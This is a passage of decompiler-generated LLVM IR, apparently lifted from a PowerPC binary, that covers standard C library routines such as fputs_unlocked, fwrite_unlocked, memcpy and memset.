  %v5_10009a48 = icmp eq i32 %v3_10009a3c, %v3_10009a40
  store i1 %v5_10009a48, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009a48, label %dec_label_pc_10009a50, label %dec_label_pc_10009a6c

dec_label_pc_10009a50:                            ; preds = %dec_label_pc_10009a3c
  %v4_10009a3c = inttoptr i32 %v3_10009a3c to i8*
  %v3_10009a50 = load i8, i8* %v4_10009a3c, align 1
  %v3_10009a54 = icmp eq i8 %v3_10009a50, 10
  store i1 %v3_10009a54, i1* %cr7_eq.global-to-local, align 1
  %v3_10009a58 = inttoptr i32 %v2_10009a58 to i8*
  store i8 %v3_10009a50, i8* %v3_10009a58, align 1
  %v0_10009a5c = load i32, i32* %r11.global-to-local, align 4
  %v1_10009a5c = load i32, i32* @r30, align 4
  %v2_10009a5c = add i32 %v1_10009a5c, 16
  %v3_10009a5c = inttoptr i32 %v2_10009a5c to i32*
  store i32 %v0_10009a5c, i32* %v3_10009a5c, align 4
  %v0_10009a60 = load i32, i32* @r31, align 4
  %v1_10009a60 = add i32 %v0_10009a60, 1
  store i32 %v1_10009a60, i32* @r31, align 4
  %v0_10009a64 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10009a64, label %dec_label_pc_10009aa8, label %dec_label_pc_10009a9c.backedge

dec_label_pc_10009a6c:                            ; preds = %dec_label_pc_10009a3c
  %v1_10009aa010 = inttoptr i32 %v0_10009a3c to i16*
  store i32 268474992, i32* @lr, align 4
  %v5_10009a6c = call i32 @getc_unlocked(i16* %v1_10009aa010, i32 %v3_10009a3c)
  %v6_10009a6c = trunc i32 %v5_10009a6c to i8
  %v4_10009a70 = icmp eq i8 %v6_10009a6c, -1
  store i1 %v4_10009a70, i1* %cr7_eq.global-to-local, align 1
  %v3_10009a78 = icmp eq i8 %v6_10009a6c, 10
  store i1 %v3_10009a78, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10009a70, label %dec_label_pc_10009a80, label %dec_label_pc_10009a90

dec_label_pc_10009a80:                            ; preds = %dec_label_pc_10009a6c
  %v0_10009a80 = load i32, i32* @r30, align 4
  %v1_10009a80 = inttoptr i32 %v0_10009a80 to i16*
  %v2_10009a80 = load i16, i16* %v1_10009a80, align 2
  %v1_10009a84 = and i16 %v2_10009a80, 8
  %v3_10009a84 = icmp eq i16 %v1_10009a84, 0
  br i1 %v3_10009a84, label %dec_label_pc_10009a80.dec_label_pc_10009aa8_crit_edge, label %dec_label_pc_10009abc

dec_label_pc_10009a80.dec_label_pc_10009aa8_crit_edge: ; preds = %dec_label_pc_10009a80
  %v0_10009aa8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009aa8

dec_label_pc_10009a90:                            ; preds = %dec_label_pc_10009a6c
  %v3_10009a90 = load i32, i32* @r31, align 4
  %v4_10009a90 = inttoptr i32 %v3_10009a90 to i8*
  store i8 %v6_10009a6c, i8* %v4_10009a90, align 1
  %v0_10009a94 = load i32, i32* @r31, align 4
  %v1_10009a94 = add i32 %v0_10009a94, 1
  store i32 %v1_10009a94, i32* @r31, align 4
  %v0_10009a98 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10009a98, label %dec_label_pc_10009aa8, label %dec_label_pc_10009a9c.backedge

dec_label_pc_10009a9c.backedge:                   ; preds = %dec_label_pc_10009a90, %dec_label_pc_10009a50
  %v2_10009a5812 = phi i32 [ %v1_10009a94, %dec_label_pc_10009a90 ], [ %v1_10009a60, %dec_label_pc_10009a50 ]
  %v0_10009a9c = load i32, i32* @r29, align 4
  %v2_10009a9c = add i32 %v0_10009a9c, -1
  store i32 %v2_10009a9c, i32* @r29, align 4
  %v0_10009aa0 = load i32, i32* @r30, align 4
  %v4_10009aa4 = icmp eq i32 %v0_10009a9c, 1
  br i1 %v4_10009aa4, label %dec_label_pc_10009aa8, label %dec_label_pc_10009a3c

dec_label_pc_10009aa8:                            ; preds = %dec_label_pc_10009a90, %dec_label_pc_10009a9c.backedge, %dec_label_pc_10009a50, %dec_label_pc_10009a34, %dec_label_pc_10009a80.dec_label_pc_10009aa8_crit_edge
  %v2_10009ab4 = phi i32 [ %v0_10009aa8.pre, %dec_label_pc_10009a80.dec_label_pc_10009aa8_crit_edge ], [ %tmp, %dec_label_pc_10009a34 ], [ %v1_10009a60, %dec_label_pc_10009a50 ], [ %v2_10009a5812, %dec_label_pc_10009a9c.backedge ], [ %v1_10009a94, %dec_label_pc_10009a90 ]
  %v1_10009aa8 = load i32, i32* @r28, align 4
  %v3_10009aa8 = icmp ugt i32 %v2_10009ab4, %v1_10009aa8
  %v4_10009aa8 = icmp eq i32 %v2_10009ab4, %v1_10009aa8
  store i1 %v4_10009aa8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009aa8, label %dec_label_pc_10009ab0, label %dec_label_pc_10009abc

dec_label_pc_10009ab0:                            ; preds = %dec_label_pc_10009aa8
  %v3_10009ab4 = inttoptr i32 %v2_10009ab4 to i8*
  store i8 0, i8* %v3_10009ab4, align 1
  %v0_10009ac4.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10009ac0

dec_label_pc_10009abc:                            ; preds = %dec_label_pc_10009a80, %dec_label_pc_10009aa8, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10009ac0

dec_label_pc_10009ac0:                            ; preds = %dec_label_pc_10009ab0, %dec_label_pc_10009abc
  %v0_10009ac4 = phi i32 [ %v0_10009ac4.pre, %dec_label_pc_10009ab0 ], [ 0, %dec_label_pc_10009abc ]
  ret i32 %v0_10009ac4

; uselistorder directives
  uselistorder i32 %v2_10009ab4, { 0, 2, 1 }
  uselistorder i8 %v6_10009a6c, { 1, 0, 2 }
  uselistorder i32 %v3_10009a40, { 1, 0 }
  uselistorder i32 %v3_10009a3c, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_10009a3c, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i8 -1, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10009ac0, { 1, 0 }
  uselistorder label %dec_label_pc_10009abc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009aa8, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10009a3c, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_10009af0 = call i32 @__GI_strlen()
  store i32 %v0_10009af0, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_10009b0c.311 to i32), i32* @lr, align 4
  %v4_10009b08 = inttoptr i32 %arg2 to i16*
  %v5_10009b08 = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_10009af0, i16* %v4_10009b08)
  %v1_10009b10 = load i32, i32* @r27, align 4
  %v4_10009b10 = icmp eq i32 %v5_10009b08, %v1_10009b10
  br i1 %v4_10009b10, label %dec_label_pc_10009b18, label %dec_label_pc_10009b1c

dec_label_pc_10009b18:                            ; preds = %entry
  br label %dec_label_pc_10009b1c

dec_label_pc_10009b1c:                            ; preds = %entry, %dec_label_pc_10009b18
  %v0_10009b1c = phi i32 [ -1, %entry ], [ %v5_10009b08, %dec_label_pc_10009b18 ]
  ret i32 %v0_10009b1c

; uselistorder directives
  uselistorder label %dec_label_pc_10009b1c, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_10009b4c = load i16, i16* %arg4, align 2
  %v4_10009b4c = zext i16 %v3_10009b4c to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_10009b5c = call i32 @__asm_rlwinm(i32 %v4_10009b4c, i32 0, i32 24, i32 25)
  %v3_10009b64 = icmp eq i32 %v1_10009b5c, 192
  br i1 %v3_10009b64, label %dec_label_pc_10009b78, label %dec_label_pc_10009b6c

dec_label_pc_10009b6c:                            ; preds = %entry
  store i32 268475248, i32* @lr, align 4
  %v3_10009b6c = call i32 @__stdio_trans2w_o(i16* nonnull %arg4)
  %v3_10009b70 = icmp eq i32 %v3_10009b6c, 0
  br i1 %v3_10009b70, label %dec_label_pc_10009b78, label %dec_label_pc_10009bd0

dec_label_pc_10009b78:                            ; preds = %dec_label_pc_10009b6c, %entry
  %v0_10009b78 = load i32, i32* @r29, align 4
  %v3_10009b78 = icmp eq i32 %v0_10009b78, 0
  %v0_10009b7c = load i32, i32* @r30, align 4
  %v3_10009b7c = icmp eq i32 %v0_10009b7c, 0
  %brmerge = or i1 %v3_10009b78, %v3_10009b7c
  br i1 %brmerge, label %dec_label_pc_10009bd0, label %dec_label_pc_10009b88

dec_label_pc_10009b88:                            ; preds = %dec_label_pc_10009b78
  %v2_10009b90 = udiv i32 -1, %v0_10009b78
  %v0_10009b94 = load i32, i32* @r31, align 4
  %v3_10009b98 = icmp ugt i32 %v0_10009b7c, %v2_10009b90
  %v1_10009bb0 = inttoptr i32 %v0_10009b94 to i16*
  br i1 %v3_10009b98, label %dec_label_pc_10009bb0, label %dec_label_pc_10009ba0

dec_label_pc_10009ba0:                            ; preds = %dec_label_pc_10009b88
  %v0_10009b8c = load i32, i32* @r28, align 4
  %v2_10009ba0 = mul i32 %v0_10009b7c, %v0_10009b78
  store i32 %v2_10009ba0, i32* %r4.global-to-local, align 4
  store i32 268475304, i32* @lr, align 4
  %v5_10009ba4 = call i32 @__stdio_fwrite(i32 %v0_10009b8c, i32 %v2_10009ba0, i16* %v1_10009bb0)
  %v1_10009ba8 = load i32, i32* @r29, align 4
  %v2_10009ba8 = udiv i32 %v5_10009ba4, %v1_10009ba8
  store i32 %v2_10009ba8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009bd4

dec_label_pc_10009bb0:                            ; preds = %dec_label_pc_10009b88
  %v2_10009bb0 = load i16, i16* %v1_10009bb0, align 2
  %v1_10009bb4 = or i16 %v2_10009bb0, 8
  store i16 %v1_10009bb4, i16* %v1_10009bb0, align 2
  %v0_10009bbc = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10009bc8 = inttoptr i32 %v0_10009bbc to i32*
  store i32 22, i32* %v2_10009bc8, align 4
  %v0_10009bd8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009bd4

dec_label_pc_10009bd0:                            ; preds = %dec_label_pc_10009b78, %dec_label_pc_10009b6c
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009bd4

dec_label_pc_10009bd4:                            ; preds = %dec_label_pc_10009bb0, %dec_label_pc_10009ba0, %dec_label_pc_10009bd0
  %v0_10009bd8 = phi i32 [ %v0_10009bd8.pre, %dec_label_pc_10009bb0 ], [ %v2_10009ba8, %dec_label_pc_10009ba0 ], [ 0, %dec_label_pc_10009bd0 ]
  ret i32 %v0_10009bd8

; uselistorder directives
  uselistorder i16* %v1_10009bb0, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 1, 2, 3, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_10009bd4, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10009bec = load i32, i32* @r5, align 4
  %v1_10009bec = call i32 @__asm_rlwinm.(i32 %v0_10009bec, i32 29, i32 3, i32 31)
  store i32 %v1_10009bec, i32* %r9.global-to-local, align 4
  %v4_10009bec = icmp eq i32 %v1_10009bec, 0
  %v0_10009bf0 = load i32, i32* @r4, align 4
  %v1_10009bf0 = add i32 %v0_10009bf0, -4
  store i32 %v1_10009bf0, i32* %r4.global-to-local, align 4
  %v0_10009bf4 = load i32, i32* @r3, align 4
  %v1_10009bf4 = add i32 %v0_10009bf4, -4
  store i32 %v1_10009bf4, i32* @r11, align 4
  br i1 %v4_10009bec, label %dec_label_pc_10009c1c, label %dec_label_pc_10009bfc

dec_label_pc_10009bfc:                            ; preds = %entry
  %v1_10009bfc = urem i32 %v1_10009bf4, 4
  %v3_10009bfc = icmp eq i32 %v1_10009bfc, 0
  br i1 %v3_10009bfc, label %dec_label_pc_10009c04, label %dec_label_pc_10009c58

dec_label_pc_10009c04:                            ; preds = %dec_label_pc_10009c78.dec_label_pc_10009c04_crit_edge, %dec_label_pc_10009bfc
  %v1_10009c10.pre = phi i32 [ %v1_10009bf4, %dec_label_pc_10009bfc ], [ %v1_10009c10.pre.pre, %dec_label_pc_10009c78.dec_label_pc_10009c04_crit_edge ]
  %v0_10009c04 = phi i32 [ %v1_10009bec, %dec_label_pc_10009bfc ], [ %v1_10009c78, %dec_label_pc_10009c78.dec_label_pc_10009c04_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_10009bfc ], [ %v2_10009c60, %dec_label_pc_10009c78.dec_label_pc_10009c04_crit_edge ]
  store i32 %v0_10009c04, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10009c08

dec_label_pc_10009c08:                            ; preds = %dec_label_pc_10009c08, %dec_label_pc_10009c04
  %v1_10009c10 = phi i32 [ %v2_10009c14, %dec_label_pc_10009c08 ], [ %v1_10009c10.pre, %dec_label_pc_10009c04 ]
  %v0_10009c08 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009c08 = add i32 %v0_10009c08, 4
  %v2_10009c08 = inttoptr i32 %v1_10009c08 to i32*
  %v3_10009c08 = load i32, i32* %v2_10009c08, align 4
  %v1_10009c0c = add i32 %v0_10009c08, 8
  %v2_10009c0c = inttoptr i32 %v1_10009c0c to i32*
  %v3_10009c0c = load i32, i32* %v2_10009c0c, align 4
  store i32 %v3_10009c0c, i32* %r9.global-to-local, align 4
  store i32 %v1_10009c0c, i32* %r4.global-to-local, align 4
  %v2_10009c10 = add i32 %v1_10009c10, 4
  %v3_10009c10 = inttoptr i32 %v2_10009c10 to i32*
  store i32 %v3_10009c08, i32* %v3_10009c10, align 4
  %v0_10009c14 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009c14 = load i32, i32* @r11, align 4
  %v2_10009c14 = add i32 %v1_10009c14, 8
  %v3_10009c14 = inttoptr i32 %v2_10009c14 to i32*
  store i32 %v0_10009c14, i32* %v3_10009c14, align 4
  store i32 %v2_10009c14, i32* @r11, align 4
  %v0_10009c18 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009c18 = add i32 %v0_10009c18, -1
  store i32 %v1_10009c18, i32* %ctr.global-to-local, align 4
  %v2_10009c18 = icmp eq i32 %v1_10009c18, 0
  br i1 %v2_10009c18, label %dec_label_pc_10009c1c, label %dec_label_pc_10009c08

dec_label_pc_10009c1c:                            ; preds = %dec_label_pc_10009c08, %dec_label_pc_10009c78, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_10009c60, %dec_label_pc_10009c78 ], [ %.0, %dec_label_pc_10009c08 ]
  %v1_10009c1c = urem i32 %.1, 8
  store i32 %v1_10009c1c, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10009c1c, 4
  br i1 %tmp, label %dec_label_pc_10009c34, label %dec_label_pc_10009c28

dec_label_pc_10009c28:                            ; preds = %dec_label_pc_10009c1c
  %v0_10009c28 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009c28 = add i32 %v0_10009c28, 4
  %v2_10009c28 = inttoptr i32 %v1_10009c28 to i32*
  %v3_10009c28 = load i32, i32* %v2_10009c28, align 4
  store i32 %v1_10009c28, i32* %r4.global-to-local, align 4
  %v1_10009c2c = add nsw i32 %v1_10009c1c, -4
  store i32 %v1_10009c2c, i32* @r5, align 4
  %v1_10009c30 = load i32, i32* @r11, align 4
  %v2_10009c30 = add i32 %v1_10009c30, 4
  %v3_10009c30 = inttoptr i32 %v2_10009c30 to i32*
  store i32 %v3_10009c28, i32* %v3_10009c30, align 4
  store i32 %v2_10009c30, i32* @r11, align 4
  %v0_10009c34.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10009c34

dec_label_pc_10009c34:                            ; preds = %dec_label_pc_10009c1c, %dec_label_pc_10009c28
  %v0_10009c34 = phi i32 [ %v1_10009c1c, %dec_label_pc_10009c1c ], [ %v0_10009c34.pre, %dec_label_pc_10009c28 ]
  %v3_10009c34 = icmp eq i32 %v0_10009c34, 0
  %v0_10009c38 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009c34, i32 %v0_10009c38)
  %v0_10009c3c = load i32, i32* @r5, align 4
  store i32 %v0_10009c3c, i32* %ctr.global-to-local, align 4
  %v0_10009c40 = load i32, i32* %r4.global-to-local, align 4
  %v1_10009c40 = add i32 %v0_10009c40, 3
  store i32 %v1_10009c40, i32* %r4.global-to-local, align 4
  %v0_10009c44 = load i32, i32* @r11, align 4
  %v1_10009c44 = add i32 %v0_10009c44, 3
  store i32 %v1_10009c44, i32* %r9.global-to-local, align 4
  %v1_10009c489 = add i32 %v0_10009c40, 4
  %v2_10009c4810 = inttoptr i32 %v1_10009c489 to i8*
  %v3_10009c4811 = load i8, i8* %v2_10009c4810, align 1
  store i32 %v1_10009c489, i32* %r4.global-to-local, align 4
  %v3_10009c4c13 = add i32 %v0_10009c44, 4
  %v4_10009c4c14 = inttoptr i32 %v3_10009c4c13 to i8*
  store i8 %v3_10009c4811, i8* %v4_10009c4c14, align 1
  store i32 %v3_10009c4c13, i32* %r9.global-to-local, align 4
  %v0_10009c5015 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009c5016 = add i32 %v0_10009c5015, -1
  store i32 %v1_10009c5016, i32* %ctr.global-to-local, align 4
  %v2_10009c5017 = icmp eq i32 %v1_10009c5016, 0
  br i1 %v2_10009c5017, label %dec_label_pc_10009c84, label %dec_label_pc_10009c48.dec_label_pc_10009c48_crit_edge

dec_label_pc_10009c48.dec_label_pc_10009c48_crit_edge: ; preds = %dec_label_pc_10009c34, %dec_label_pc_10009c48.dec_label_pc_10009c48_crit_edge
  %v3_10009c4c18 = phi i32 [ %v3_10009c4c, %dec_label_pc_10009c48.dec_label_pc_10009c48_crit_edge ], [ %v3_10009c4c13, %dec_label_pc_10009c34 ]
  %v0_10009c48.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10009c48 = add i32 %v0_10009c48.pre, 1
  %v2_10009c48 = inttoptr i32 %v1_10009c48 to i8*
  %v3_10009c48 = load i8, i8* %v2_10009c48, align 1
  store i32 %v1_10009c48, i32* %r4.global-to-local, align 4
  %v3_10009c4c = add i32 %v3_10009c4c18, 1
  %v4_10009c4c = inttoptr i32 %v3_10009c4c to i8*
  store i8 %v3_10009c48, i8* %v4_10009c4c, align 1
  store i32 %v3_10009c4c, i32* %r9.global-to-local, align 4
  %v0_10009c50 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009c50 = add i32 %v0_10009c50, -1
  store i32 %v1_10009c50, i32* %ctr.global-to-local, align 4
  %v2_10009c50 = icmp eq i32 %v1_10009c50, 0
  br i1 %v2_10009c50, label %dec_label_pc_10009c84, label %dec_label_pc_10009c48.dec_label_pc_10009c48_crit_edge

dec_label_pc_10009c58:                            ; preds = %dec_label_pc_10009bfc
  %v1_10009c58 = sub nsw i32 4, %v1_10009bfc
  store i32 %v1_10009c58, i32* %ctr.global-to-local, align 4
  %v1_10009c60 = load i32, i32* @r5, align 4
  %v2_10009c60 = sub i32 %v1_10009c60, %v1_10009c58
  br label %dec_label_pc_10009c64

dec_label_pc_10009c64:                            ; preds = %dec_label_pc_10009c64.dec_label_pc_10009c64_crit_edge, %dec_label_pc_10009c58
  %v2_10009c6c = phi i32 [ %v1_10009c70, %dec_label_pc_10009c64.dec_label_pc_10009c64_crit_edge ], [ %v1_10009bf4, %dec_label_pc_10009c58 ]
  %v0_10009c64 = phi i32 [ %v0_10009c64.pre, %dec_label_pc_10009c64.dec_label_pc_10009c64_crit_edge ], [ %v1_10009bf0, %dec_label_pc_10009c58 ]
  %v1_10009c64 = add i32 %v0_10009c64, 4
  %v2_10009c64 = inttoptr i32 %v1_10009c64 to i8*
  %v3_10009c64 = load i8, i8* %v2_10009c64, align 1
  %v1_10009c68 = add i32 %v0_10009c64, 1
  store i32 %v1_10009c68, i32* %r4.global-to-local, align 4
  %v3_10009c6c = add i32 %v2_10009c6c, 4
  %v4_10009c6c = inttoptr i32 %v3_10009c6c to i8*
  store i8 %v3_10009c64, i8* %v4_10009c6c, align 1
  %v0_10009c70 = load i32, i32* @r11, align 4
  %v1_10009c70 = add i32 %v0_10009c70, 1
  store i32 %v1_10009c70, i32* @r11, align 4
  %v0_10009c74 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009c74 = add i32 %v0_10009c74, -1
  store i32 %v1_10009c74, i32* %ctr.global-to-local, align 4
  %v2_10009c74 = icmp eq i32 %v1_10009c74, 0
  br i1 %v2_10009c74, label %dec_label_pc_10009c78, label %dec_label_pc_10009c64.dec_label_pc_10009c64_crit_edge

dec_label_pc_10009c64.dec_label_pc_10009c64_crit_edge: ; preds = %dec_label_pc_10009c64
  %v0_10009c64.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10009c64

dec_label_pc_10009c78:                            ; preds = %dec_label_pc_10009c64
  %v1_10009c78 = call i32 @__asm_rlwinm.(i32 %v2_10009c60, i32 29, i32 3, i32 31)
  store i32 %v1_10009c78, i32* %r9.global-to-local, align 4
  %v4_10009c78 = icmp eq i32 %v1_10009c78, 0
  br i1 %v4_10009c78, label %dec_label_pc_10009c1c, label %dec_label_pc_10009c78.dec_label_pc_10009c04_crit_edge

dec_label_pc_10009c78.dec_label_pc_10009c04_crit_edge: ; preds = %dec_label_pc_10009c78
  %v1_10009c10.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10009c04

dec_label_pc_10009c84:                            ; preds = %dec_label_pc_10009c48.dec_label_pc_10009c48_crit_edge, %dec_label_pc_10009c34
  %v0_10009c84 = load i32, i32* @r3, align 4
  ret i32 %v0_10009c84

; uselistorder directives
  uselistorder i32 %v1_10009c78, { 1, 2, 0 }
  uselistorder i32 %v1_10009c74, { 1, 0 }
  uselistorder i32 %v1_10009c70, { 1, 0 }
  uselistorder i32 %v0_10009c64, { 1, 0 }
  uselistorder i32 %v2_10009c60, { 2, 1, 0 }
  uselistorder i32 %v1_10009c50, { 1, 0 }
  uselistorder i32 %v3_10009c4c, { 1, 2, 0 }
  uselistorder i32 %v1_10009c1c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10009c18, { 1, 0 }
  uselistorder i32 %v2_10009c14, { 1, 2, 0 }
  uselistorder i32 %v1_10009bfc, { 1, 0 }
  uselistorder i32 %v1_10009bf4, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_10009c48.dec_label_pc_10009c48_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10009c34, { 1, 0 }
  uselistorder label %dec_label_pc_10009c1c, { 1, 0, 2 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10009c88 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_10009c88, i32* %r9.global-to-local, align 4
  %v4_10009c88 = icmp eq i32 %v1_10009c88, 0
  store i1 %v4_10009c88, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  %v1_10009c90 = add i32 %arg1, -4
  store i32 %v1_10009c90, i32* %r11.global-to-local, align 4
  %v1_10009c94 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_10009c98 = call i32 @__asm_rlwimi(i32 %v1_10009c94, i32 16, i32 0, i32 15)
  %v2_10009c98 = trunc i32 %v1_10009c98 to i8
  %v0_10009c9c = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10009c9c, label %dec_label_pc_10009cc0, label %dec_label_pc_10009ca0

dec_label_pc_10009ca0:                            ; preds = %entry
  %v0_10009ca0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009ca0 = urem i32 %v0_10009ca0, 4
  %v3_10009ca0 = icmp eq i32 %v1_10009ca0, 0
  store i1 %v3_10009ca0, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_10009ca0, label %dec_label_pc_10009ca0.dec_label_pc_10009ca8_crit_edge, label %dec_label_pc_10009cf0

dec_label_pc_10009ca0.dec_label_pc_10009ca8_crit_edge: ; preds = %dec_label_pc_10009ca0
  %v0_10009ca8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009ca8

dec_label_pc_10009ca8:                            ; preds = %dec_label_pc_10009d08.dec_label_pc_10009ca8_crit_edge, %dec_label_pc_10009ca0.dec_label_pc_10009ca8_crit_edge
  %v0_10009cac.pre = phi i32 [ %v0_10009ca0, %dec_label_pc_10009ca0.dec_label_pc_10009ca8_crit_edge ], [ %v0_10009cac.pre.pre, %dec_label_pc_10009d08.dec_label_pc_10009ca8_crit_edge ]
  %v0_10009ca8 = phi i32 [ %v0_10009ca8.pre, %dec_label_pc_10009ca0.dec_label_pc_10009ca8_crit_edge ], [ %v1_10009d08, %dec_label_pc_10009d08.dec_label_pc_10009ca8_crit_edge ]
  store i32 %v0_10009ca8, i32* %ctr.global-to-local, align 4
  %v1_10009cb0 = sext i8 %v2_10009c98 to i32
  br label %dec_label_pc_10009cac

dec_label_pc_10009cac:                            ; preds = %dec_label_pc_10009cac, %dec_label_pc_10009ca8
  %v0_10009cac = phi i32 [ %v1_10009cb8, %dec_label_pc_10009cac ], [ %v0_10009cac.pre, %dec_label_pc_10009ca8 ]
  %v1_10009cac = add i32 %v0_10009cac, 4
  store i32 %v1_10009cac, i32* %r9.global-to-local, align 4
  %v4_10009cb0 = inttoptr i32 %v1_10009cac to i32*
  store i32 %v1_10009cb0, i32* %v4_10009cb0, align 4
  %v2_10009cb4 = load i32, i32* %r9.global-to-local, align 4
  %v3_10009cb4 = add i32 %v2_10009cb4, 4
  %v4_10009cb4 = inttoptr i32 %v3_10009cb4 to i32*
  store i32 %v1_10009cb0, i32* %v4_10009cb4, align 4
  %v0_10009cb8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009cb8 = add i32 %v0_10009cb8, 4
  store i32 %v1_10009cb8, i32* %r11.global-to-local, align 4
  %v0_10009cbc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009cbc = add i32 %v0_10009cbc, -1
  store i32 %v1_10009cbc, i32* %ctr.global-to-local, align 4
  %v2_10009cbc = icmp eq i32 %v1_10009cbc, 0
  br i1 %v2_10009cbc, label %dec_label_pc_10009cc0, label %dec_label_pc_10009cac

dec_label_pc_10009cc0:                            ; preds = %dec_label_pc_10009cac, %dec_label_pc_10009d08, %entry
  %v0_10009cc0 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009cc0 = urem i32 %v0_10009cc0, 8
  store i32 %v1_10009cc0, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_10009cc0, 4
  br i1 %tmp, label %dec_label_pc_10009cd4, label %dec_label_pc_10009ccc

dec_label_pc_10009ccc:                            ; preds = %dec_label_pc_10009cc0
  %v1_10009ccc = sext i8 %v2_10009c98 to i32
  %v2_10009ccc = load i32, i32* %r11.global-to-local, align 4
  %v3_10009ccc = add i32 %v2_10009ccc, 4
  %v4_10009ccc = inttoptr i32 %v3_10009ccc to i32*
  store i32 %v1_10009ccc, i32* %v4_10009ccc, align 4
  store i32 %v3_10009ccc, i32* %r11.global-to-local, align 4
  %v0_10009cd0 = load i32, i32* @r5, align 4
  %v1_10009cd0 = add i32 %v0_10009cd0, -4
  store i32 %v1_10009cd0, i32* @r5, align 4
  br label %dec_label_pc_10009cd4

dec_label_pc_10009cd4:                            ; preds = %dec_label_pc_10009cc0, %dec_label_pc_10009ccc
  %v0_10009cd4 = phi i32 [ %v1_10009cc0, %dec_label_pc_10009cc0 ], [ %v1_10009cd0, %dec_label_pc_10009ccc ]
  %v3_10009cd4 = icmp eq i32 %v0_10009cd4, 0
  %v0_10009cd8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009cd4, i32 %v0_10009cd8)
  %v0_10009cdc = load i32, i32* @r5, align 4
  store i32 %v0_10009cdc, i32* %ctr.global-to-local, align 4
  %v0_10009ce0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009ce0 = add i32 %v0_10009ce0, 3
  store i32 %v1_10009ce0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009ce4

dec_label_pc_10009ce4:                            ; preds = %dec_label_pc_10009ce4, %dec_label_pc_10009cd4
